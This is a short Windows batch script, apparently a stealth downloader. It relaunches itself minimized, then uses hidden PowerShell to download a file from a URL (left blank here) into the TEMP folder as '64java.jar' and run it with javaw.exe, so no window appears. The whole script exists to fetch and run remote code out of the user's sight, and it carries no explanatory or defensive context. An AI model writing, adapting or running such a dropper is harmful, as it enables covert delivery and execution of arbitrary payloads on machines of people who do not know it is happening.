@echo off
if "%1"=="h" goto :hidden
start /min cmd /c "%~f0" h & exit /b
:hidden
powershell.exe -NoProfile -WindowStyle Hidden -Command "$url=''; $out=Join-Path $env:TEMP '64java.jar'; Invoke-WebRequest -Uri $url -OutFile $out; javaw.exe -jar $out"
